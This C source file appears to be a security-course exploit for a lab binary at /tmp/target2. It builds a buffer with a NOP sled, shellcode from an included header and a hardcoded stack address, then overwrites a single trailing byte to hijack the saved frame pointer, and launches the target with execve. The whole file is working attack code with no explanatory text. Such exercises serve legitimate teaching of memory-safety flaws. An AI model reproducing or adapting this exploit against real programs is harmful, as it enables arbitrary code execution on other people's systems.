#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET 	"/tmp/target2"
#define NOP	0x90

char buff[241];

int main(void)
{
  char new_adr[] = "\x70";
  char SBP_points_to[] = "\x88\xfc\xff\xbf";
  char *args[3];
  char *env[1];

  int i;
  for (i = 0; i < 241; i++) {
    buff[i] = NOP;
  }
  
  for (i = 0; i < strlen(shellcode); i++) {
    buff[i + 160] = shellcode[i];
  }

  for (i = 0; i < strlen(SBP_points_to); i++) {
    buff[i + 236] = SBP_points_to[i];
  }

  buff[240] = new_adr[0];

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
